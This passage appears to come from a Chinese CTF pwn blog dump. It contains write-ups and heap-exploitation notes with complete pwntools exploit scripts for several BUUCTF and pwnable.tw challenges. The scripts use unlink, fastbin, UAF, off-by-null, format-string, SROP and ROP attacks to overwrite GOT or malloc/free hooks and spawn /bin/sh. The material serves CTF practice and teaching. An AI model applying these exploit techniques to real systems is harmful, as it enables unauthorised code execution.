hollk.sendline(str(idx)) hollk.sendline(str(size)) hollk.send(content) hollk.recvuntil('OK\\n')def free(idx): hollk.sendline('3') hollk.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 alloc(0x30) # idx 2 # small chunk size inorder to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who's size is 0x20 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head - 0x8) #fd payload += p64(head) #bk payload += p64(0x20) # next chunk's prev_size bypass the check payload = payload.ljust(0x30, 'a') # overwrite global[3]'s chunk's prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) hollk.recvuntil('OK\\n') #gdb.attach(hollk) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = 'a' * 8 + p64(hollkelf.got['free']) + p64(hollkelf.got['puts']) + p64( hollkelf.got['atoi']) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(hollkelf.plt['puts']) edit(0, len(payload), payload) #free global[1] to leak puts addr free(1) puts_addr = hollk.recvuntil('\\nOK\\n', drop=True).ljust(8, '\\x00') puts_addr = u64(puts_addr) log.success('puts addr: ' + hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] binsh_addr = libc_base + next(libc.search('/bin/sh')) system_addr = libc_base + libc.symbols['system'] log.success('libc base: ' + hex(libc_base)) log.success('/bin/sh addr: ' + hex(binsh_addr)) log.success('system addr: ' + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) hollk.send(p64(binsh_addr)) hollk.interactive() if __name__ == &quot;__main__&quot;: exp() # axb_2019_heap # 知识点 pwndbg 使用 regs 查看寄存器里得值 利用思路 利用格式化字符串泄露 libc 和程序基址 运用 unlink 将 chunk 0 地址覆写为 free_hook 的地址 将 system 地址写入 free_hook 触发写入的’/bin/sh’块的删除，执行 system (’/bin/sh’) # WP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *#p = remote(&quot;node3.buuoj.cn&quot;,26144)p = process(&quot;./axb_2019_heap&quot;)context.log_level = 'debug'elf = ELF(&quot;./axb_2019_heap&quot;)libc = ELF('./libc-2.23-64.so')def add(idx,size,content): p.sendlineafter('&gt;&gt;','1') p.sendlineafter('):',str(idx)) p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content) def delete(idx): p.sendlineafter('&gt;&gt;','2') p.sendlineafter('index:',str(idx)) def edit(idx,content): p.sendlineafter('&gt;&gt;','4') p.sendlineafter('index:',str(idx)) p.sendlineafter('content: \\n',content) def show(): p.sendlineafter('&gt;&gt;','3')p.recvuntil('name: ')p.sendline('%11$p%15$p')p.recvuntil('Hello, ')base=int(p.recv(14),16)-0x1186#success(&quot;base:&quot;+hex(base))libcbase=int(p.recv(14),16)-libc.sym['__libc_start_main']-240system=libcbase+libc.sym['system']free_hook=libcbase+libc.sym['__free_hook']bss=base+0x202060success(&quot;bss:&quot;+hex(bss))add(0,0x98,'aaaa')#0add(1,0x98,'bbbb')#1add(2,0x90,'cccc')#2add(3,0x90,'/bin/sh\\x00')#3 #gdb.attach(p) payload=p64(0)+p64(0x91)+p64(bss-0x18)+p64(bss-0x10)+p64(0)*14+p64(0x90)+'\\xa0'edit(0,payload)#gdb.attach(p)delete(1)edit(0,p64(0)*3+p64(free_hook)+p64(0x10))#gdb.attach(p)edit(0,p64(system))#gdb.attach(p)delete(3) p.interactive()","link":"/2021/11/25/unlink/"},{"title":"xdctf2015_pwn200","text":"DynELF 使用 # 程序分析 程序检查：32 位程序 主函数：vul 中存在栈溢出 # 关于 DynELF ​ 在做漏洞利用时，由于 ASLR 的影响，我们在获取某些函数地址的时候，需要一些特殊的操作。一种方法是先泄露出 libc.so 中的某个函数，然后根据函数之间的偏移，计算得到我们需要的函数地址，这种方法的局限性在于我们需要能找到和目标服务器上一样的 libc.so，而有些特殊情况下往往并不能找到。而另一种方法，利用如 pwntools 的 DynELF 模块，对内存进行搜索，直接得到我们需要的函数地址。 ​ 官方文档里给出了下面的例子： 123456789101112131415161718192021222324252627282930313233343536# Assume a process or remote connectionp = process('./pwnme')# Declare a function that takes a single address, and# leaks at least one byte at that address.def leak(address): data = p.read(address, 4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or '').encode('hex'))) return data# For the sake of this example, let's say that we# have any of these pointers. One is a pointer into# the target binary, the other two are pointers into libcmain = 0xfeedf4celibc = 0xdeadb000system = 0xdeadbeef# With our leaker, and a pointer into our target binary,# we can resolve the address of anything.## We do not actually need to have a copy of the target# binary for this to work.d = DynELF(leak, main)assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# However, if we *do* have a copy of the target binary,# we can speed up some of the steps.d = DynELF(leak, main, elf=ELF('./pwnme'))assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# Alternately, we can resolve symbols inside another library,# given a pointer into it.d = DynELF(leak, libc + 0x1234)assert d.lookup('system') == system 可以看到，为了使用 DynELF，首先需要有一个 leak(address) 函数，通过这一函数可以获取到某个地址上最少 1 byte 的数据，然后将这个函数作为参数调用 d = DynELF(leak, main) ，该模块就初始化完成了，然后就可以使用它提供的函数进行内存搜索，得到我们需要的函数地址。 # 漏洞利用 第一次栈溢出 write 函数泄露 libc 地址，返回 main 函数，使用 DynELF 查找 system 地址写入 /bin/sh，再次 rop 执行拿到 shell # EXP 12345678910111213141516171819202122232425262728from pwn import *r=remote('node4.buuoj.cn',25224)# r= process('./bof')elf=ELF('./bof')read_addr=elf.symbols['read']write_addr=elf.symbols['write']main_addr=0x804851cbss_addr=elf.symbols['__bss_start'] def leak(addr): //write函数泄露libc地址 r.recvline() payload='a'*0x6c+'b'*0x4+p32(write_addr)+p32(main_addr)+p32(1)+p32(addr)+p32(0x4) r.sendline(payload) leak_addr=r.recv(4) return leak_addrd=DynELF(leak,elf=ELF('./bof'))system_addr=d.lookup('system','libc')payload='a'*0x6c+'b'*0x4+p32(read_addr)+p32(main_addr)+p32(0x0)+p32(bss_addr)+p32(0x8)r.sendline(payload)r.sendline('/bin/sh') # 通过read函数读入/bin/sh到bss段payload='a'*0x6c+'b'*0x4+p32(system_addr)+p32(main_addr)+p32(bss_addr)r.sendline(payload)r.interactive() 法二 : ret2dl-resolve 1234567891011121314151617181920212223242526272829303132333435#coding=UTF-8from pwn import *context.log_level = 'debug'sh = remote('node4.buuoj.cn',25224)elf = ELF('bof')libc = ELF('./libc-2.23x86.so')payload = 112 * 'a'payload += p32(elf.plt['write'])payload += p32(elf.symbols['main'])payload += p32(1)payload += p32(elf.got['write'])payload += p32(4)sh.sendline(payload)write_addr = u32(sh.recvuntil('\\xf7')[-4:]) #获取write函数地址print hex(write_addr)libcbase = write_addr - libc.symbols['write']system = libcbase + libc.symbols['system']binsh = libcbase + libc.search('/bin/sh').next()payload = 112 * 'a'payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)sh.sendline(payload)sh.interactive() # 参考文章 https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.8_dynelf.html","link":"/2022/02/01/xdctf2015_pwn200/"},{"title":"堆题总结","text":"堆基础总结 # 堆数据结构 1234567+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk | prev_size | size |A|M|P|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| user data (fd) | (bk) || || |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk # Off By One # 漏洞原理 使用循环语句向堆块中写入数据时，循环次数设置错误导致多写入了一个字节 # 利用思路 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。 （1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。 （2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与 prev_size 是否一致。 # Large bin 当 large bin 中只存在一个 chunk 时，那么该 chunk 的两个 nextsize 指针都会指向自己 # unlink unlink 过程如下图所示，主要实现堆块合并 对于 unlink (P,BK,FD) 函数本质是赋值 123456unlink(P,BK,FD){ FD = P -&gt; fd; BK = p -&gt; bk; FD -&gt; bk = BK; BK -&gt; fd = fd; } 堆块结构 FD = *(p-0x10)，0x10 是由 fd 指针在堆块的位置决定的，具体利用过程 12*(P-&gt;fd+0x18) = *(P-&gt;bk)*(P-&gt;bk+0x10) = *(P-&gt;fd) # UAF # 漏洞原理 申请任意大小的堆块并在删除时未清空指针数组（即没有设置为 NUL），导致悬空指针从而产生 UAF # 利用思路 例题： pwnable.tw - hacknote 解题思路： 通过 UAF 调用一个存在于堆块，并且被一系列对操作篡改的函数指针控制流劫持从而 getshell 具体参考文章 # EXP 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = 'debug'libc = ELF('./libc_32.so.6')# io = process('./hacknote')io = remote('chall.pwnable.tw',10102)def add(size,content): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;size :&quot;) io.sendline(str(size)) io.recvuntil(&quot;Content :&quot;) io.sendline(content)def delete(num): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(num))def show(num): io.recvuntil(&quot;choice :&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(num))add(64,'a')add(32,'a')delete(0)add(64,'b')show(2) //unsortbin泄露libc地址libc_base = u32(io.recv(8)[4:8])-0x1b07b0system_addr = libc_base+libc.symbols['system']delete(0)delete(1)add(8,p32(system_addr)+&quot;;sh\\x00&quot;)show(0)io.interactive() # house of force # 利用前提 能够控制 top chunk 的 size 域（如堆溢出） 能够自由控制堆分配 size 大小，如申请负数的堆 向上申请 chunk 实现任意地址写 # 例题 bamboobox 修改长度可以覆盖到 top chunk 的 size 位置从而修改 top chunk size= -1, 因为 size 为无符号数，-1 被解释为 0xffffff。 利用 house of force 将 top chunk 位置放在 heap base，可以是 got 表地址也可以是分配的堆块地址。 再申请一个 0x10 堆块去修改函数指针为指定地址。 # Double Free # 漏洞原理 free 了两次堆块，在 glibc 中的检查如下： 检查 main_arean 是否指向了原来的一个 chunk, 绕过只需要 free (p1);free (p2);free (p1)，改写 fdd 指针一般执行 add 函数，然后连续 free 出 chunk2,chunk1 和构造的 fake_chunk（这个 chunk 的地址在 got 表上），对 got 表进行一个覆写，将 puts 函数 got 表改写成 magic 函数的地址。 # 利用思路 malloc 出一个 chunk1，更改 chunk1 的 fd，又由于此时 chunk1 在 fastbin list，因此可以指向一个 fakebin 实现任意地址写 # Off by null &amp;&amp; Tcache &amp;&amp; Overlap off-by-null: 利用改写将 pre_issue 位改成 \\x00 然后导致前面一个堆块莫名其妙的就 free 了（当然不是真的莫名其妙，详细请看堆块结构和记录，简单的说就是 pre_issue 是位了记录前一个堆块 free or use 情况的）。接着就是利用堆块合并，获得一个 free 的但是其实并没有 free 的堆块，这就是 overlap。整个过程其实说明了，off-by-null 可以触发 overlap，并且还是 powerful 的，可以用来泄漏地址。也可以用来修改 fd strcpy 字符串函数：复制时，遇到结束符 \\x00 才会停止复制。复制结束后，会在最后写入一个结束符 \\x00 strlen: j 不将’\\x00’结束符计入字符串长度 tcache: 这个机制和 fastbin 很像，但是为了效率会比 fastbin 少很多检查。并且堆块都会在 tacahe 走一遍再出来给我们使用，有一些特殊情况不会比如合并了的 unsortedbin。他总共有 7 个，满了才会用其他的类别的 chunk。对 double free 的检查基本没有。 例题：HITCON_2018_children_tcache 待补充 ing… # 参考文章 https://trick.ink/article/Heap_Learn/ https://blog.csdn.net/m0_56897090/article/details/120510003 https://www.freebuf.com/system/171261.html https://xz.aliyun.com/t/4324#toc-15","link":"/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/"},{"title":"babyheap_0ctf_2017","text":"堆溢出 # malloc_chunk 的结构 参考文章：https://blog.csdn.net/weixin_43847969/article/details/104897249 pre_size: 这个参数分两种情况，一种情况记录大小，一种情况记录数据 当前一个 chunk 的状态是空闲时记录大小（也就是被 free 的时候）， 当前一个 chunk 的状态不是空闲的时候，记录它的数据。 然后是 size： 就是这个 chunk 的大小，size 的最后 3 个比特位对大小没有影响，但是要表示了一些东西 分别是 non_main_arena : 记录当前 chunk 是否属于主线程 is_mapped：当前 chunk 是否由 mmap 分配 prev_inuse：记录前一个 chunk 是否被分配（这个最重要，因为我们当这个参数为 0 时，我们能够通过它获得上一个 chunk 的大小和地址） fd,bk: 表示用户数据，或者表示地址 chunk 非空闲时，fd 和 bk 存在的地方表示的是用户的数据， chunk 空闲时，fd 存储下一个空闲的 chunk，bk 指向上一个空闲的 chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被 free 的顺序，而不是地址上的相邻。 # chunk 的结构 第一个是 size of previous（前一个 chunk 的大小，如果前一个 chunk 空闲的话） 第二个 size of chunk 当前 chunk 的大小，然后再末尾有 3 个比特位 amp 分别代表上面介绍过的 3 个参数 第三个就是存储数据的部分 然后就到了下一个 chunk (next_chunk)，我们把这个 next_chunk 称为 chunk2, 上面的 chunk 称为 chunk1，可以看到如果 chunk1 正在使用的话，那么 chunk 的头部位置，也就是 prev_size，会被 chunk1 使用 然后 chunk2 的第二行的后三个比特位也分别是 A01，A 代表着是否属于主线程（这里我们不知道所以用 A 代替），0 代表着当前 chunk 不是由 mmap 分配，1 代表着前一个 chunk 已经被分配。 chunk 被 free 后结构变化： 第一行，没变化，因为它是 chunk1 第二行开始，M 的位置变成了 0，代表着 chunk 不是由 mmap 分配 第三行开始，原本存储数据的部分变成了 forward pointer to next chunk in list 也就是 fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被 free 了，那么就存储的是下一个空闲的 chunk，下面的 back pointer to previous chunk in list（bk）同理. 然后就到了 unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种 bin 中去。 然后就到了 chunk2, 第一行记录当前 chunk 的大小，（并且不会被前一个 chunk 占用） 第二行记录前一个 chunk 的大小，并且末尾三位变成了 A00,（这时候如果这个是堆中第一个被分配的 chunk 的话我们能通过 prev_size 字段获取上一个 chunk 的大小以及地址。） chunk 的空间复用： # bin 及分类 # fast bins # small bins # large bins # unsorted bins 未被分类，刚被 free 未真的进入 bin Top Chunk # babyheap_0ctf_2017 考点： fastbin attack # 利用思路 两次 double free 与 fastbin attack 。 第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。 第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。 # 利用过程 1、通过 unsortedbin attack 来泄露 libc 地址 首先应该记住这样一条规律：当 small chunk 被释放时，它的 fd、bk 指向一个指针，这个指针指向 top chunk 地址，这个指针保存在 main_arena 的 0x58 偏移处，而 main_arena 是 libc 的 data 段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出 libc 的基地址了，所以重点是当 small chunk 释放时，能读出 fd 或者 bk 的值 我首先通过如下重叠两个块来泄漏 libc 的地址（也是常见的攻击）。 payload: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *e = ELF('./libc-2.23.so')p = remote('node4.buuoj.cn',29370)# p = process('./babyheap')p.readuntil('Command:')context(log_level='debug')def alloc(a): p.writeline('1') p.readuntil('Size:') p.writeline(str(a)) #p.readuntil('Command:')def update(a,b,c): p.writeline('2') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Size:') p.writeline(str(b)) p.readuntil('Content:') p.write(c) p.readuntil('Command:')def dele(a): p.writeline('3') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Command:')def show(a): p.writeline('4') p.readuntil('Index:') p.writeline(str(a))alloc(0x18) #0alloc(0x18) #1alloc(0x68) #2alloc(0x68) #3update(0, 0x20, 'a'*0x18+p64(0x91)) #size1+size2dele(1) #1 #free1alloc(0x18) #alloc1show(2) #fd, bk at alloc2#gdb.attach(p)libcbase = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x3c4b78log.info(hex(libcbase))malloc_hook = libcbase + 0x3c4aedlog.info(hex(malloc_hook))one = libcbase + 0x4526adele(2) #free2#gdb.attach(p)update(1, 0x28, 'a'*0x18+p64(0x71)+p64(malloc_hook)) #fd at 2-&gt;malloc_hook#gdb.attach(p)alloc(0x68) #2#gdb.attach(p)alloc(0x68) #4 at malloc_hook#gdb.attach(p)update(4, 0x1b, p8(2)*3+p64(2)*2+p64(one))#gdb.attach(p)alloc(255) p.interactive()","link":"/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"title":"BUUCTF Pwn Exercise(一)","text":"BUUOJ PWN EXERCISE # rootersctf_2019_srop(srop) # EXP 1234567891011121314151617181920212223242526272829303132from pwn import *sh = process(&quot;rootersctf_2019_srop&quot;)context.update(arch=&quot;amd64&quot;, os=&quot;linux&quot;, endian=&quot;little&quot;)# write /bin/sh on 0x402000data_addr = 0x402000syscall_leave_ret = 0x401033pop_rax_syscall_leave_ret = 0x401032syscall_addr = 0x401046frame = SigreturnFrame(kernel=&quot;amd64&quot;)frame.rax = 0 # read frame.rdi = 0 # stdinframe.rsi = data_addrframe.rdx = 0x400frame.rip = syscall_leave_retframe.rbp = data_addr + 0x20layout = [0x88 * &quot;a&quot;, pop_rax_syscall_leave_ret, 0xf, bytes(frame)]# srop to call read, set *data_addr = /bin/sh\\x00sh.sendlineafter(&quot;Hey, can i get some feedback for the CTF?\\n&quot;, flat(layout))# call execve /bin/shlayout = [&quot;/bin/sh\\x00&quot;, &quot;a&quot; * 0x20, pop_rax_syscall_leave_ret, 0xf]frame = SigreturnFrame(kernel=&quot;amd64&quot;)frame.rax = 59 # execve frame.rdi = data_addr # stdinframe.rsi = 0frame.rdx = 0frame.rip = syscall_addrlayout.append(bytes(frame))sh.sendline(flat(layout))sh.interactive() # 参考文章 https://blog.csdn.net/weixin_46521144/article/details/120714498 https://www.cnblogs.com/LynneHuan/p/14723605.html#exp # qctf_2018_stack2（数组越界） # EXP 123456789101112131415161718192021222324252627#!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') sh = remote(&quot;node3.buuoj.cn&quot;,&quot;28924&quot;) sh.sendlineafter('have:\\n','0') sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(116 + 0x10)) sh.sendlineafter('number:\\n',str(0x9b)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(117 + 0x10)) sh.sendlineafter('number:\\n',str(0x85)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(118 + 0x10)) sh.sendlineafter('number:\\n',str(0x04)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(119 + 0x10)) sh.sendlineafter('number:\\n',str(0x08)) sh.sendlineafter('5. exit\\n','5') sh.interactive() # hfctf_2020_marksman(exit_hook) # EXP 123456789101112131415161718192021222324252627282930313233from pwn import *import functoolsLOG_ADDR = lambda x, y: log.success('{} ===&gt; {}'.format(x, hex(y)))int16 = functools.partial(int, base=16)# sh = process(&quot;./hfctf_2020_marksman&quot;)sh = remote('node4.buuoj.cn',27982)sh.recvuntil(&quot;I placed the target near: &quot;)msg = sh.recvline()puts_addr = int16(msg[:-1].decode())LOG_ADDR(&quot;puts_addr&quot;, puts_addr)libc_base_addr = puts_addr - 0x809c0LOG_ADDR(&quot;libc_base_addr&quot;, libc_base_addr)one_gadget1 = libc_base_addr + 0x10a387__rtld_lock_unlock_recursive_offset = 0x81df60target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset# one_gadget1 = libc_base_addr + 0xe569f# _dl_catch_error_offset = 0x5f4038# target_addr = libc_base_addr + _dl_catch_error_offsetsh.sendlineafter(&quot;shoot!shoot!\\n&quot;, str(target_addr))input_gadget = one_gadget1for _ in range(3): sh.sendlineafter(&quot;biang!\\n&quot;, chr(input_gadget &amp; 0xff)) input_gadget = input_gadget &gt;&gt; 8sh.interactive() # 参考文章 Python 中的 functools # picoctf_2018_echooo (32 位格式化字符串) # EXP 12345678910111213from pwn import *#p=process('./PicoCTF_2018_echooo')p=remote('node4.buuoj.cn',28387)offset=11flag=''for i in range(27,27+11): payload='%{}$p'.format(str(i)) p.sendlineafter('&gt; ',payload) aim=unhex(p.recvuntil('\\n',drop=True).replace('0x','')) flag+=aim[::-1]print flagp.interactive() # npuctf_2020_level2 (args 上的格式化字符串漏洞) # 程序分析 # 漏洞利用 漏洞点为 printf 格式化字符串部分，但 buf 在 bss 段不在栈上因而不能通过填地址来写入，需要借助地址链分批次写入 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import functoolsLOG_ADDR = lambda x, y: log.success('{} ===&gt; {}'.format(x, hex(y)))int16 = functools.partial(int, base=16)context.update(arch='amd64', os='linux', endian='little')# sh = process('./npuctf_2020_level2')sh = remote('node4.buuoj.cn',27290)sh.sendline(&quot;%9$p,%24$p&quot;)msg = sh.recvline()stack_addr, libc_addr = msg[:-1].split(b',')stack_addr = int16(stack_addr.decode())libc_addr = int16(libc_addr.decode())LOG_ADDR('stack_addr', stack_addr)LOG_ADDR('libc_addr', libc_addr)stack_ret_addr = stack_addr - 0xe0libc_base_addr = libc_addr - 0x3e7638LOG_ADDR('stack_ret_addr', stack_ret_addr)LOG_ADDR('libc_base_addr', libc_base_addr)gadgets = [0x4f2c5, 0x4f322, 0x10a38c]one_gadget = libc_base_addr + gadgets[0]LOG_ADDR('one_gadget', one_gadget)sleep(1)payload = &quot;%{}c%9$hn&quot;.format((stack_ret_addr &amp; 0xffff))sh.sendline(payload)sh.recv()for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%35$hn&quot;.format((one_gadget &amp; 0xffff)) + 'a' * 0x10sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%9$hhn&quot;.format((stack_ret_addr &amp; 0xff) + 2)sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%35$hhn&quot;.format(((one_gadget &gt;&gt; 16) &amp; 0xff)) + 'a' * 0x10sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)sh.send(&quot;6&quot; * 8 + '\\x00' * 8)sleep(3)sh.sendline(&quot;cat flag&quot;)sh.interactive() 123456789101112131415161718192021222324252627282930from pwn import *#9 35#p=process('./npuctf_2020_level2')p=remote('node4.buuoj.cn',27290)libc=ELF('./libc-2.27.so')context.log_level='debug'payload1='%7$p#%9$p@'p.sendline(payload1)p.recvuntil('0x')libc_base=(int(p.recvuntil(&quot;#&quot;,True),16) - 231)-libc.symbols['__libc_start_main']p.recvuntil('0x')addr_stack=int(p.recvuntil(&quot;@&quot;,True),16)-0xe0one_gadgets = [0x4f2c5,0x4f322,0x10a38c]one_gadget=one_gadgets[1]+libc_basestackbase = addr_stack &amp; 0xffffp.sendlineafter('\\n', '%' + str(stackbase) + 'c%9$hn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(one_gadget&amp;0xff)+'c%35$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(stackbase+1)+'c%9$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str((one_gadget&gt;&gt;8)&amp;0xffff)+'c%35$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(stackbase+2)+'c%9$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str((one_gadget&gt;&gt;16)&amp;0xff)+'c%35$hhn\\x00')#p.recv('\\x20\\x20\\xb4')p.sendline('66666666\\x00')#p.recv()print(hex(libc.symbols['__libc_start_main']))#gdb.attach(p)p.interactive() # asis2016_b00ks(off-by-null) # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 28085)#r = process(&quot;./asis2016_b00ks&quot;)context(log_level = 'debug', arch = 'amd64', os = 'linux')DEBUG = 0if DEBUG: gdb.attach(r, ''' b *$rebase(0x1245) x/20gx $rebase(0x202040) c ''')elf = ELF(&quot;./b00ks&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]menu = &quot;&gt; &quot;def add(size1, content1, size2, content2): r.recvuntil(menu) r.sendline('1') r.recvuntil(&quot;Enter book name size: &quot;) r.sendline(str(size1)) r.recvuntil(&quot;Enter book name (Max 32 chars): &quot;) r.send(content1) r.recvuntil(&quot;Enter book description size: &quot;) r.sendline(str(size2)) r.recvuntil(&quot;Enter book description: &quot;) r.send(content2)def delete(index): r.recvuntil(menu) r.sendline('2') r.recvuntil(&quot;Enter the book id you want to delete: &quot;) r.sendline(str(index))def edit(index, content): r.recvuntil(menu) r.sendline('3') r.recvuntil(&quot;Enter the book id you want to edit: &quot;) r.sendline(str(index)) r.recvuntil(&quot;Enter new book description: &quot;) r.send(content)def show(): r.recvuntil(menu) r.sendline('4')def edit_name(name): r.recvuntil(menu) r.sendline('5') r.recvuntil(&quot;Enter author name: &quot;) r.send(name)r.recvuntil(&quot;Enter author name: &quot;)r.send('a'*0x20+'\\n')add(0x90, 'aa\\n', 0x90, 'aa\\n')add(0x21000, 'aa\\n', 0x21000, 'aa\\n')show()r.recvuntil('a'*0x20)heap = u64(r.recvuntil('\\n').strip().ljust(8, '\\x00')) - 0x160success(&quot;heap:&quot;+hex(heap))payload = 'a' * 0x40 + p64(1) + p64(heap+0x198)*2 + p64(0xffff) + '\\n'edit(1, payload)edit_name('a'*0x20 + '\\n')show()r.recvuntil(&quot;Name: &quot;)#offset = 0x7fc715ef1010 - 0x7fc71593e000offset = 0x7f4875e6a010 - 0x7f48758a4000libc.address = u64(r.recvuntil('\\x7f').ljust(8, '\\x00')) - offsetsuccess(&quot;libc:&quot;+hex(libc.address))free_hook = libc.sym['__free_hook']system = libc.sym['system']bin_sh = libc.search(&quot;/bin/sh&quot;).next()edit(1, p64(bin_sh) + p64(free_hook) + '\\n')edit(2, p64(system)+'\\n')delete(2)r.interactive() # babyfengshui_33c3_2016 # 程序分析 checksec 后可以看到 relro 保护没开，可以劫持函数 got 表 由于是 *（&amp;ptr+a1）-4 是靠偏移来确定大小的，所以也就只有在 name 堆块与 text 堆块在物理地址相邻时才有作用，因此我们可以通过 delete 函数删除一个 user 便可以使程序连续 free 掉两个堆块，从而使两个 0x88 的堆块合并成为一个 0x110 的堆块 进而我们再次使用 add 添加数据的时候，第一次输入的 name 设置大小为 0x100 就可以使 name 与 text 堆块物理不相邻，这样一来我们的 text 字段便可输入任意大小的数据 接下来就可以对能够造成溢出的 name 堆块填充大量的数据覆盖到下一个 user 的 name 字段中，来控制下一个 user 中的 text 地址指向 最后便可以控制该 text 指向某个函数的 got 表地址，即可劫持函数的 got 表指向 system 函数。 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *from LibcSearcher import LibcSearchercontext.log_level='debug'# p=remote(&quot;node4.buuoj.cn&quot;,26147)p=process('./babyfengshui')elf=ELF('./babyfengshui')free_got=elf.got['free']def add(size,name,length,text): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;0&quot;) p.sendlineafter(&quot;size of description: &quot;,str(size)) p.sendlineafter(&quot;name: &quot;,name) p.recvuntil(&quot;text length:&quot;) p.sendline(str(length)) p.recvuntil(&quot;text:&quot;) p.sendline(text)def delete(index): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index))def show(index): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index))def update(index,length,text): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index)) p.recvuntil(&quot;text length: &quot;) p.sendline(str(length)) p.recvuntil(&quot;text: &quot;) p.sendline(text)add(0x80,&quot;nam1&quot;,0x80,&quot;aaaa&quot;)add(0x80,&quot;nam2&quot;,0x80,&quot;bbbb&quot;)add(0x80,&quot;nam3&quot;,0x80,&quot;/bin/sh\\x00&quot;) #写入/bin/shdelete(0)add(0x100,'nam1',0x100,&quot;cccc&quot;)payload='a'*0x108+'a'*0x8+'a'*0x80+'a'*0x8+p32(free_got)update(3,0x200,payload)show(1)p.recvuntil(&quot;description: &quot;)free_addr=u32(p.recv(4))libc=LibcSearcher(&quot;free&quot;,free_addr)libc_base=free_addr-libc.dump(&quot;free&quot;)system_addr=libc_base+libc.dump(&quot;system&quot;)update(1,0x80,p32(system_addr))delete(2)p.interactive() # gyctf_2020_borrowstack (栈迁移) 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *from LibcSearcher import *r=remote('node3.buuoj.cn',29385)bank=0x0601080leave=0x400699puts_plt=0x04004E0puts_got=0x0601018pop_rdi=0x400703main=0x0400626ret=0x4004c9r.recvuntil('u 